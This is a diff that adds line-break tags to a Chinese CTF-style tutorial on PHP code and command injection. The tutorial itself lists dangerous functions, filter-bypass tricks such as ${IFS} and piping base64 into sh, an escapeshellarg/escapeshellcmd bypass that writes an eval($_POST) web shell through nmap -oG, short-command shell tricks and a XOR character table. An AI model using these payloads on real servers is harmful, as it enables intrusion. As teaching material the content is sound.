@@ -8454,7 +8454,7 @@
 
 <h2 id="_1">代码/命令执行</h2>
 <h2 id="_2">概念</h2>
-<p>由于没有针对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并交由服务器执行
+<p>由于没有针对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并交由服务器执行<br />
 代码/命令注入攻击中web服务器没有过滤类似system()、eval()、exec()等函数的传入参数是该漏洞的主要原因</p>
 <h2 id="_3">代码注入相关函数</h2>
 <h3 id="eval">eval()</h3>
@@ -8464,11 +8464,11 @@ $a='phpinfo();';
 eval($a);
 ?&gt;
 </code></pre>
-<p>Mixed eval(string code_str)
-eval-把字符串作为PHP代码执行
+<p>Mixed eval(string code_str)<br />
+eval-把字符串作为PHP代码执行<br />
 Code_str是PHP代码字符串</p>
-<p>如果是：eval('phpinfo();'); 会显示phpinfo
-但是如果是eval('phpinfo()');  没有分号，那就会报错了
+<p>如果是：eval('phpinfo();'); 会显示phpinfo<br />
+但是如果是eval('phpinfo()');  没有分号，那就会报错了<br />
 eval('echo 123;'); 会打印123</p>
 <p>菜刀php7就连不上了，推荐蚁剑，而且蚁剑开源，不用担心后门问题</p>
 <h3 id="assert">assert()</h3>
@@ -8482,8 +8482,8 @@ assert($a);
 echo 123;
 ?&gt;
 </code></pre>
-<p>跟eval()不同，如果只是传一个字符串那还是不会执行，需要函数配合
-assert("echo 123;");    报错
+<p>跟eval()不同，如果只是传一个字符串那还是不会执行，需要函数配合<br />
+assert("echo 123;");    报错<br />
 assert("eval("echo 123;")");才可以正常输出123</p>
 <h3 id="call_user_func">call_user_func()</h3>
 <pre><code class="language-php">&lt;?php
@@ -8494,15 +8494,15 @@ call_user_func($a,$b);
 call_user_func('assert','phpinfo()');
 ?&gt;
 </code></pre>
-<p>$a='system';
-$b='pwd';
-call_user_func($a,$b)，第一个参数是回调函数，第二个是给调用的函数传递的参数
+<p>$a='system';<br />
+$b='pwd';<br />
+call_user_func($a,$b)，第一个参数是回调函数，第二个是给调用的函数传递的参数<br />
 就会执行system('pwd')</p>
-<p>以下函数不能被call_user_func()调用：
+<p>以下函数不能被call_user_func()调用：<br />
 array()、echo()、empty()、eval()、exit()、isset()、list()、print()、unset()</p>
 <h3 id="call_user_func_array">call_user_func_array()</h3>
-<p>$a='assert';
-$b=array('phpinfo()'); 
+<p>$a='assert';<br />
+$b=array('phpinfo()'); <br />
 call_user_func_array($a,$b)    第一个参数是被调用的回调函数，第二个参数是要被传入回调函数的数组</p>
 <h3 id="create_function">create_function()</h3>
 <pre><code class="language-php">&lt;?php
@@ -8515,9 +8515,9 @@ $b=create_fuction(' ',$a);
 $b();
 ?&gt;
 </code></pre>
-<p>$a=create_function('$code','echo $code;');
-$b='hello';
-$a($b);
+<p>$a=create_function('$code','echo $code;');<br />
+$b='hello';<br />
+$a($b);<br />
 创建了一个匿名函数，直接给了$a，第一个参定义了一个参数，第二个参数定义了执行效果</p>
 <h3 id="array_map">array_map()</h3>
 <p>array_map  为数组的每个元素应用回调函数</p>
@@ -8556,11 +8556,11 @@ system('whoami');
 <h3 id="shell_exec">shell_exec()</h3>
 <p>还是要用var_dump(exec('ls'));</p>
 <h3 id="_5">``运算符</h3>
-<p>echo <code>ls</code>
+<p>echo <code>ls</code><br />
 会直接打印出 ls 产生的结果</p>
 <h3 id="preg_replace-e">preg_replace /e</h3>
-<p>执行一个正则表达式的搜索和替换
-preg_replace($pattern, $replacement, $subject)
+<p>执行一个正则表达式的搜索和替换<br />
+preg_replace($pattern, $replacement, $subject)<br />
 搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换</p>
 <p>例如</p>
 <pre><code class="language-php">&lt;?php
@@ -8571,15 +8571,15 @@ echo $str;// 将会改变为'fl ag'
 </code></pre>
 <p><img alt="image.png" src="../img/551828_depgt1esyncqazvd/1601864927870-223a942f-0d75-4733-b4b6-e31ffeb2b456-518886.png" /></p>
 <blockquote>
-<p>如果您尝试匹配该字符，则应转义以下内容
-\ ^。 $ | （）[]
-* +？ {}，
-特殊字符定义
-\引用下一个元字符
-^匹配行首
-。匹配任何字符（换行符除外）
-$匹配行尾（或在换行符之前）
-|轮换
+<p>如果您尝试匹配该字符，则应转义以下内容<br />
+\ ^。 $ | （）[]<br />
+* +？ {}，<br />
+特殊字符定义<br />
+\引用下一个元字符<br />
+^匹配行首<br />
+。匹配任何字符（换行符除外）<br />
+$匹配行尾（或在换行符之前）<br />
+|轮换<br />
 （）分组</p>
 <p>[]角色类别</p>
 <p>*匹配0次或更多次</p>
@@ -8634,7 +8634,7 @@ $匹配行尾（或在换行符之前）
     print_r($_GET);
 ?&gt;
 </code></pre>
-<p>相当于 eval('strtolower("\1");')
+<p>相当于 eval('strtolower("\1");')<br />
 而 \1 就是 \1 也就是匹配到的第一个</p>
 <p>如果是这样的话就可以执行 phpinfo</p>
 <pre><code class="language-php">&lt;?php
@@ -8656,7 +8656,7 @@ system($rce.$_GET[1])
 <p>例如 flag被过滤了，直接 cat ????.txt 就行</p>
 <p><img alt="image.png" src="../img/551828_depgt1esyncqazvd/1605926060125-3ecaec7a-21ce-4d75-9467-c4c263e897b5-582141.png" /></p>
 <h4 id="php">PHP 字符串解析特性</h4>
-<p>当 php 查询字符串进行解析的时候会将某些字符删除或用下划线代替
+<p>当 php 查询字符串进行解析的时候会将某些字符删除或用下划线代替<br />
 参考：https://www.freebuf.com/articles/web/213359.html</p>
 <pre><code class="language-php">&lt;?php
     foreach(
@@ -8688,45 +8688,45 @@ system($rce.$_GET[1])
 <h4 id="_12">后台进程</h4>
 <p>&amp;</p>
 <h4 id="_13">管道符</h4>
-<p>|
-echo 'ls'|bash
+<p>|<br />
+echo 'ls'|bash<br />
 把左边的输出作为右边的输入</p>
 <h4 id="_14">逻辑</h4>
 <p>||  &amp;&amp;</p>
 <h4 id="_15">空格代替</h4>
-<p>可以用下面这些来代替空格：
-${IFS}
-&lt;
-$IFS
-$IFS$9（这个数字随意）
-%09  在url中传递参数
+<p>可以用下面这些来代替空格：<br />
+${IFS}<br />
+&lt;<br />
+$IFS<br />
+$IFS$9（这个数字随意）<br />
+%09  在url中传递参数<br />
 $a=l;$b=s;$a$b -&gt; ls</p>
 <h4 id="base64">base64编码</h4>
-<p><code>echo d2hvYW1p| base64 -d</code>
-d2hvYW1p是whoami的b64编码
-结果就是whoami的结果
+<p><code>echo d2hvYW1p| base64 -d</code><br />
+d2hvYW1p是whoami的b64编码<br />
+结果就是whoami的结果<br />
 echo Y2F0IGZsYWcucGhw|base64 -d|sh</p>
 <p><img alt="image.png" src="../img/551828_depgt1esyncqazvd/1599440211509-b3ed7e41-5631-405d-85ad-65e4d67c3810-373374.png" /></p>
-<p>额，备份一下
+<p>额，备份一下<br />
 <img alt="WJ" src="../img/551828_depgt1esyncqazvd/1563845977709-c22d71e7-1823-40a5-941a-7a67e88e7c4d-998436.png" /></p>
-<p>可以直接 cat <code>ls</code>
+<p>可以直接 cat <code>ls</code><br />
 把反引号内的命令输出作为输入给 cat</p>
 <p><code>echo Y2F0IGZsYWcudHh0|base64 -d</code>|base64</p>
 <p><img alt="image.png" src="../img/551828_depgt1esyncqazvd/1605925977911-b72acb5e-4cf1-404e-989c-05ad0afce859-047028.png" /></p>
 <h4 id="escapeshellargescapeshellcmd">escapeshellarg&amp;escapeshellcmd</h4>
-<p><strong>escapeshellarg</strong>
-**
-字符串增加一个单引号并且能引用或者转码任何已经存在的单引号
+<p><strong>escapeshellarg</strong><br />
+**<br />
+字符串增加一个单引号并且能引用或者转码任何已经存在的单引号<br />
 string escapeshellarg(string $arg)</p>
 <p><img alt="image.png" src="../img/551828_depgt1esyncqazvd/1600691830489-2dced7cf-d0f2-4b08-954d-4821108fb78e-976612.png" /></p>
 <p>在执行命令的时候，如果外面包裹的是双引号，是可以正常的执行的，要是能让他双引号拼接的话说不定...</p>
 <p><img alt="image.png" src="../img/551828_depgt1esyncqazvd/1600690039198-8adae215-8168-4349-a9bb-b42970d8b61c-876149.png" /></p>
 <p><strong>escapeshellcmd</strong></p>
-<p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义
+<p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义<br />
 在 &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF 前插入反斜线</p>
 <p>转义了 <code>;</code> 实际执行的命令是 <code>ls '/root;' 'id'</code></p>
 <p><img alt="image.png" src="../img/551828_depgt1esyncqazvd/1600692854905-c729ebd5-7444-479b-bede-b8cfa1f3c389-725314.png" /></p>
-<p>两个结合起来，如果先用了 escapeshellarg，后用了 escapeshellcmd：
+<p>两个结合起来，如果先用了 escapeshellarg，后用了 escapeshellcmd：<br />
 <strong>例题：<a href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">[BUUCTF 2018]Online Tool</a></strong></p>
 <p>就看这些</p>
 <pre><code class="language-php">&lt;?php
@@ -8736,19 +8736,19 @@ string escapeshellarg(string $arg)</p>
     echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
 }
 </code></pre>
-<p>想通过 nmap 的 -oG 把命令写入一个文件里面
+<p>想通过 nmap 的 -oG 把命令写入一个文件里面<br />
 <code>' &lt;?php eval($_POST["v"]);?&gt; -oG shell.php '</code></p>
-<p>首先经过 escapeshellarg，处理之后的样子↓
+<p>首先经过 escapeshellarg，处理之后的样子↓<br />
 ''\'' &lt;?php eval($_POST["v"]);?&gt; -oG shell.php '\'''</p>
-<p>然后经过 escapeshellcmd 转义后：
+<p>然后经过 escapeshellcmd 转义后：<br />
 ''\'' &lt;\?php eval(\$_POST["v"])\;\?&gt; -oG shell.php '\'''</p>
-<p>然后实际上他就是
+<p>然后实际上他就是<br />
 nmap -T5 -sT -Pn --host-timeout 2 -F  \ &lt;?php eval($_POST["v"]);?&gt; -oG shell.php \</p>
 <p><img alt="image.png" src="../img/551828_depgt1esyncqazvd/1600696532901-6c29a943-65d3-46cc-aaf8-6616e22442f5-655142.png" /></p>
 <p>ps.这个题 flag 在根目录：/flag</p>
 <h3 id="_16">无回显</h3>
 <h4 id="_17">延时</h4>
-<p>比如：ls|sleep 3
+<p>比如：ls|sleep 3<br />
 延时3秒，就说明执行了命令</p>
 <h4 id="http">HTTP请求</h4>
 <h4 id="dns">DNS请求</h4>
@@ -8765,13 +8765,13 @@ if(strlen($_GET[1])&lt;15){
 }
 ?&gt;
 </code></pre>
-<p>一个&gt;是写入
-两个是追加
+<p>一个&gt;是写入<br />
+两个是追加<br />
 有的需要反斜线来告诉他是字符</p>
-<p>echo /&lt;?php &gt;1
-echo eval(&gt;&gt;1
-echo \$_GET&gt;&gt;1
-echo [1]&gt;&gt;1
+<p>echo /&lt;?php &gt;1<br />
+echo eval(&gt;&gt;1<br />
+echo \$_GET&gt;&gt;1<br />
+echo [1]&gt;&gt;1<br />
 echo )\;&gt;&gt;1</p>
 <p>这样才能写入：</p>
 <pre><code class="language-php">&lt;?php
@@ -8788,7 +8788,7 @@ echo shell_exec($_GET[1]);
 }
 ?&gt;
 </code></pre>
-<p>命令 &gt; 文件名
+<p>命令 &gt; 文件名<br />
 会将结果输出到文件中</p>
 <pre><code class="language-shell">w&gt;hp
 w&gt;1.p
@@ -8813,33 +8813,33 @@ sh 0        执行
 <p>5个可控字符</p>
 <p>其实可以直接&gt;文件名</p>
 <blockquote>
-<p>ls\
+<p>ls\<br />
 ls&gt;a</p>
 </blockquote>
 <p>此时目录下有ls 文件名</p>
 <blockquote>
-<p>-t\
-&gt;0
+<p>-t\<br />
+&gt;0<br />
 ls&gt;&gt;a</p>
 </blockquote>
 <h4 id="4">4位可控字符</h4>
-<p>* 只带当前目录下文件
+<p>* 只带当前目录下文件<br />
 相当于把目录下的文件名拼接成一句话来运行</p>
-<p>rev 会把文件倒过来输出
-如果存在文件名：rev  v  v里面内容是12345
-* 的效果就是输出54321，相当于给rev传递了一个v的参数
+<p>rev 会把文件倒过来输出<br />
+如果存在文件名：rev  v  v里面内容是12345<br />
+* 的效果就是输出54321，相当于给rev传递了一个v的参数<br />
 注意是每一行反过来，不是整个的</p>
-<p>ls会把每个结果作为一行
+<p>ls会把每个结果作为一行<br />
 dir会把所有的拼成一行</p>
 <p>整个过程：</p>
 <blockquote>
-<p>f&gt;     最终生成的文件名，为了不影响 dir 要把名字改的在d后面
-ht-
-sl
-dir       生成dir文件，然后 * 就是dir的效果了
-<em>&gt;v         把dir的效果输出到v里面
-rev        创建一个v
-</em>v&gt;0       反向结果输出到0
+<p>f&gt;     最终生成的文件名，为了不影响 dir 要把名字改的在d后面<br />
+ht-<br />
+sl<br />
+dir       生成dir文件，然后 * 就是dir的效果了<br />
+<em>&gt;v         把dir的效果输出到v里面<br />
+rev        创建一个v<br />
+</em>v&gt;0       反向结果输出到0<br />
 sh 0       运行</p>
 </blockquote>
 <h4 id="_19">无字母数字</h4>
@@ -8866,70 +8866,70 @@ for($i = 0;$i&lt;strlen($a);$i++){
 }
 ?&gt;
 </code></pre>
-<p>结果：
-~ xor $ is Z 90 
-~ xor &amp; is X 88 
-~ xor * is T 84 
-~ xor ( is V 86 
-~ xor ) is W 87 
-~ xor + is U 85 
-~ xor / is Q 81 
-~ xor ? is A 65 
-~ xor . is P 80 
-~ xor , is R 82 
-~ xor &lt; is B 66 
-~ xor - is S 83 
-~ xor = is C 67 
-! xor @ is a 97 
-! xor ` is A 65 
-! xor { is Z 90 
-@ xor ! is a 97 
-@ xor # is c 99 
-@ xor $ is d 100 
-@ xor % is e 101 
-@ xor &amp; is f 102 
-@ xor * is j 106 
-@ xor ( is h 104 
-@ xor ) is i 105 
-@ xor + is k 107 
-@ xor / is o 111 
-@ xor . is n 110 
-@ xor , is l 108 
+<p>结果：<br />
+~ xor $ is Z 90 <br />
+~ xor &amp; is X 88 <br />
+~ xor * is T 84 <br />
+~ xor ( is V 86 <br />
+~ xor ) is W 87 <br />
+~ xor + is U 85 <br />
+~ xor / is Q 81 <br />
+~ xor ? is A 65 <br />
+~ xor . is P 80 <br />
+~ xor , is R 82 <br />
+~ xor &lt; is B 66 <br />
+~ xor - is S 83 <br />
+~ xor = is C 67 <br />
+! xor @ is a 97 <br />
+! xor ` is A 65 <br />
+! xor { is Z 90 <br />
+@ xor ! is a 97 <br />
+@ xor # is c 99 <br />
+@ xor $ is d 100 <br />
+@ xor % is e 101 <br />
+@ xor &amp; is f 102 <br />
+@ xor * is j 106 <br />
+@ xor ( is h 104 <br />
+@ xor ) is i 105 <br />
+@ xor + is k 107 <br />
+@ xor / is o 111 <br />
+@ xor . is n 110 <br />
+@ xor , is l 108 <br />
 @ xor - is m 109 </p>
 <h2 id="xor-is-c-99">xor @ is c 99</h2>
 <h2 id="xor-is-c-67">xor ` is C 67</h2>
 <h2 id="xor-is-x-88">xor { is X 88</h2>
 <h2 id="xor-is-x-120">xor [ is x 120</h2>
-<p>$ xor ~ is Z 90 
-$ xor @ is d 100 
-$ xor \ is x 120 
-$ xor | is X 88 
+<p>$ xor ~ is Z 90 <br />
+$ xor @ is d 100 <br />
+$ xor \ is x 120 <br />
+$ xor | is X 88 <br />
 $ xor <code>is D 68 
 $ xor } is Y 89 
 $ xor ] is y 121 
 % xor @ is e 101 
 % xor \ is y 121 
 % xor | is Y 89 
-% xor</code> is E 69 
-% xor } is X 88 
-% xor ] is x 120 
-^ xor &amp; is x 120 
-^ xor * is t 116 
-^ xor ( is v 118 
-^ xor ) is w 119 
-^ xor + is u 117 
-^ xor / is q 113 
-^ xor ? is a 97 
-^ xor . is p 112 
-^ xor , is r 114 
-^ xor &lt; is b 98 
-^ xor - is s 115 
-^ xor = is c 99 
-&amp; xor ~ is X 88 
-&amp; xor @ is f 102 
-&amp; xor ^ is x 120 
-&amp; xor _ is y 121 
-&amp; xor | is Z 90 
+% xor</code> is E 69 <br />
+% xor } is X 88 <br />
+% xor ] is x 120 <br />
+^ xor &amp; is x 120 <br />
+^ xor * is t 116 <br />
+^ xor ( is v 118 <br />
+^ xor ) is w 119 <br />
+^ xor + is u 117 <br />
+^ xor / is q 113 <br />
+^ xor ? is a 97 <br />
+^ xor . is p 112 <br />
+^ xor , is r 114 <br />
+^ xor &lt; is b 98 <br />
+^ xor - is s 115 <br />
+^ xor = is c 99 <br />
+&amp; xor ~ is X 88 <br />
+&amp; xor @ is f 102 <br />
+&amp; xor ^ is x 120 <br />
+&amp; xor _ is y 121 <br />
+&amp; xor | is Z 90 <br />
 &amp; xor <code>is F 70 
 * xor ~ is T 84 
 * xor @ is j 106 
@@ -8937,17 +8937,17 @@ $ xor ] is y 121 
 * xor _ is u 117 
 * xor \ is v 118 
 * xor | is V 86 
-* xor</code> is J 74 
-* xor { is Q 81 
-* xor } is W 87 
-* xor [ is q 113 
-* xor ] is w 119 
-( xor ~ is V 86 
-( xor @ is h 104 
-( xor ^ is v 118 
-( xor _ is w 119 
-( xor \ is t 116 
-( xor | is T 84 
+* xor</code> is J 74 <br />
+* xor { is Q 81 <br />
+* xor } is W 87 <br />
+* xor [ is q 113 <br />
+* xor ] is w 119 <br />
+( xor ~ is V 86 <br />
+( xor @ is h 104 <br />
+( xor ^ is v 118 <br />
+( xor _ is w 119 <br />
+( xor \ is t 116 <br />
+( xor | is T 84 <br />
 ( xor <code>is H 72 
 ( xor { is S 83 
 ( xor } is U 85 
@@ -8959,29 +8959,29 @@ $ xor ] is y 121 
 ) xor _ is v 118 
 ) xor \ is u 117 
 ) xor | is U 85 
-) xor</code> is I 73 
-) xor { is R 82 
-) xor } is T 84 
-) xor [ is r 114 
-) xor ] is t 116 
-_ xor &amp; is y 121 
-_ xor * is u 117 
-_ xor ( is w 119 
-_ xor ) is v 118 
-_ xor + is t 116 
-_ xor / is p 112 
-_ xor . is q 113 
-_ xor , is s 115 
-_ xor &lt; is c 99 
-_ xor &gt; is a 97 
-_ xor - is r 114 
-_ xor = is b 98 
-+ xor ~ is U 85 
-+ xor @ is k 107 
-+ xor ^ is u 117 
-+ xor _ is t 116 
-+ xor \ is w 119 
-+ xor | is W 87 
+) xor</code> is I 73 <br />
+) xor { is R 82 <br />
+) xor } is T 84 <br />
+) xor [ is r 114 <br />
+) xor ] is t 116 <br />
+_ xor &amp; is y 121 <br />
+_ xor * is u 117 <br />
+_ xor ( is w 119 <br />
+_ xor ) is v 118 <br />
+_ xor + is t 116 <br />
+_ xor / is p 112 <br />
+_ xor . is q 113 <br />
+_ xor , is s 115 <br />
+_ xor &lt; is c 99 <br />
+_ xor &gt; is a 97 <br />
+_ xor - is r 114 <br />
+_ xor = is b 98 <br />
++ xor ~ is U 85 <br />
++ xor @ is k 107 <br />
++ xor ^ is u 117 <br />
++ xor _ is t 116 <br />
++ xor \ is w 119 <br />
++ xor | is W 87 <br />
 + xor <code>is K 75 
 + xor { is P 80 
 + xor } is V 86 
@@ -9020,25 +9020,25 @@ _ xor = is b 98 
 / xor _ is p 112 
 / xor \ is s 115 
 / xor | is S 83 
-/ xor</code> is O 79 
-/ xor { is T 84 
-/ xor } is R 82 
-/ xor [ is t 116 
-/ xor ] is r 114 
-? xor ~ is A 65 
-? xor ^ is a 97 
-? xor \ is c 99 
-? xor | is C 67 
-? xor { is D 68 
-? xor } is B 66 
-? xor [ is d 100 
-? xor ] is b 98 
-. xor ~ is P 80 
-. xor @ is n 110 
-. xor ^ is p 112 
-. xor _ is q 113 
-. xor \ is r 114 
-. xor | is R 82 
+/ xor</code> is O 79 <br />
+/ xor { is T 84 <br />
+/ xor } is R 82 <br />
+/ xor [ is t 116 <br />
+/ xor ] is r 114 <br />
+? xor ~ is A 65 <br />
+? xor ^ is a 97 <br />
+? xor \ is c 99 <br />
+? xor | is C 67 <br />
+? xor { is D 68 <br />
+? xor } is B 66 <br />
+? xor [ is d 100 <br />
+? xor ] is b 98 <br />
+. xor ~ is P 80 <br />
+. xor @ is n 110 <br />
+. xor ^ is p 112 <br />
+. xor _ is q 113 <br />
+. xor \ is r 114 <br />
+. xor | is R 82 <br />
 . xor <code>is N 78 
 . xor { is U 85 
 . xor } is S 83 
@@ -9050,32 +9050,32 @@ _ xor = is b 98 
 , xor _ is s 115 
 , xor \ is p 112 
 , xor | is P 80 
-, xor</code> is L 76 
-, xor { is W 87 
-, xor } is Q 81 
-, xor [ is w 119 
-, xor ] is q 113 
-&lt; xor ~ is B 66 
-&lt; xor ^ is b 98 
-&lt; xor _ is c 99 
-&lt; xor { is G 71 
-&lt; xor } is A 65 
-&lt; xor [ is g 103 
+, xor</code> is L 76 <br />
+, xor { is W 87 <br />
+, xor } is Q 81 <br />
+, xor [ is w 119 <br />
+, xor ] is q 113 <br />
+&lt; xor ~ is B 66 <br />
+&lt; xor ^ is b 98 <br />
+&lt; xor _ is c 99 <br />
+&lt; xor { is G 71 <br />
+&lt; xor } is A 65 <br />
+&lt; xor [ is g 103 <br />
 &lt; xor ] is a 97 </p>
 <blockquote>
-<p>xor _ is a 97 
-xor \ is b 98 
-xor | is B 66 
-xor { is E 69 
-xor } is C 67 
-xor [ is e 101 
-xor ] is c 99 
-<code>xor ! is A 65</code> xor # is C 67 
-<code>xor $ is D 68</code> xor % is E 69 
-<code>xor &amp; is F 70</code> xor * is J 74 
-<code>xor ( is H 72</code> xor ) is I 73 
-<code>xor + is K 75</code> xor / is O 79 
-<code>xor . is N 78</code> xor , is L 76 
+<p>xor _ is a 97 <br />
+xor \ is b 98 <br />
+xor | is B 66 <br />
+xor { is E 69 <br />
+xor } is C 67 <br />
+xor [ is e 101 <br />
+xor ] is c 99 <br />
+<code>xor ! is A 65</code> xor # is C 67 <br />
+<code>xor $ is D 68</code> xor % is E 69 <br />
+<code>xor &amp; is F 70</code> xor * is J 74 <br />
+<code>xor ( is H 72</code> xor ) is I 73 <br />
+<code>xor + is K 75</code> xor / is O 79 <br />
+<code>xor . is N 78</code> xor , is L 76 <br />
 <code>xor - is M 77 
 - xor ~ is S 83 
 - xor @ is m 109 
@@ -9083,70 +9083,70 @@ xor ] is c 99 
 - xor _ is r 114 
 - xor \ is q 113 
 - xor | is Q 81 
-- xor</code> is M 77 
-- xor { is V 86 
-- xor } is P 80 
-- xor [ is v 118 
-- xor ] is p 112 
-= xor ~ is C 67 
-= xor ^ is c 99 
-= xor _ is b 98 
-= xor \ is a 97 
-= xor | is A 65 
-= xor { is F 70 
-= xor [ is f 102 
-{ xor ! is Z 90 
-{ xor # is X 88 
-{ xor * is Q 81 
-{ xor ( is S 83 
-{ xor ) is R 82 
-{ xor + is P 80 
-{ xor / is T 84 
-{ xor ? is D 68 
-{ xor . is U 85 
-{ xor , is W 87 
-{ xor &lt; is G 71 
-{ xor &gt; is E 69 
-{ xor - is V 86 
-{ xor = is F 70 
-} xor $ is Y 89 
-} xor % is X 88 
-} xor * is W 87 
-} xor ( is U 85 
-} xor ) is T 84 
-} xor + is V 86 
-} xor / is R 82 
-} xor ? is B 66 
-} xor . is S 83 
-} xor , is Q 81 
-} xor &lt; is A 65 
-} xor &gt; is C 67 
-} xor - is P 80 
-[ xor # is x 120 
-[ xor * is q 113 
-[ xor ( is s 115 
-[ xor ) is r 114 
-[ xor + is p 112 
-[ xor / is t 116 
-[ xor ? is d 100 
-[ xor . is u 117 
-[ xor , is w 119 
-[ xor &lt; is g 103 
-[ xor &gt; is e 101 
-[ xor - is v 118 
-[ xor = is f 102 
-] xor $ is y 121 
-] xor % is x 120 
-] xor * is w 119 
-] xor ( is u 117 
-] xor ) is t 116 
-] xor + is v 118 
-] xor / is r 114 
-] xor ? is b 98 
-] xor . is s 115 
-] xor , is q 113 
-] xor &lt; is a 97 
-] xor &gt; is c 99 
+- xor</code> is M 77 <br />
+- xor { is V 86 <br />
+- xor } is P 80 <br />
+- xor [ is v 118 <br />
+- xor ] is p 112 <br />
+= xor ~ is C 67 <br />
+= xor ^ is c 99 <br />
+= xor _ is b 98 <br />
+= xor \ is a 97 <br />
+= xor | is A 65 <br />
+= xor { is F 70 <br />
+= xor [ is f 102 <br />
+{ xor ! is Z 90 <br />
+{ xor # is X 88 <br />
+{ xor * is Q 81 <br />
+{ xor ( is S 83 <br />
+{ xor ) is R 82 <br />
+{ xor + is P 80 <br />
+{ xor / is T 84 <br />
+{ xor ? is D 68 <br />
+{ xor . is U 85 <br />
+{ xor , is W 87 <br />
+{ xor &lt; is G 71 <br />
+{ xor &gt; is E 69 <br />
+{ xor - is V 86 <br />
+{ xor = is F 70 <br />
+} xor $ is Y 89 <br />
+} xor % is X 88 <br />
+} xor * is W 87 <br />
+} xor ( is U 85 <br />
+} xor ) is T 84 <br />
+} xor + is V 86 <br />
+} xor / is R 82 <br />
+} xor ? is B 66 <br />
+} xor . is S 83 <br />
+} xor , is Q 81 <br />
+} xor &lt; is A 65 <br />
+} xor &gt; is C 67 <br />
+} xor - is P 80 <br />
+[ xor # is x 120 <br />
+[ xor * is q 113 <br />
+[ xor ( is s 115 <br />
+[ xor ) is r 114 <br />
+[ xor + is p 112 <br />
+[ xor / is t 116 <br />
+[ xor ? is d 100 <br />
+[ xor . is u 117 <br />
+[ xor , is w 119 <br />
+[ xor &lt; is g 103 <br />
+[ xor &gt; is e 101 <br />
+[ xor - is v 118 <br />
+[ xor = is f 102 <br />
+] xor $ is y 121 <br />
+] xor % is x 120 <br />
+] xor * is w 119 <br />
+] xor ( is u 117 <br />
+] xor ) is t 116 <br />
+] xor + is v 118 <br />
+] xor / is r 114 <br />
+] xor ? is b 98 <br />
+] xor . is s 115 <br />
+] xor , is q 113 <br />
+] xor &lt; is a 97 <br />
+] xor &gt; is c 99 <br />
 ] xor - is p 112 </p>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/web/igzkae">https://www.yuque.com/hxfqg9/web/igzkae</a></p>
 </blockquote>
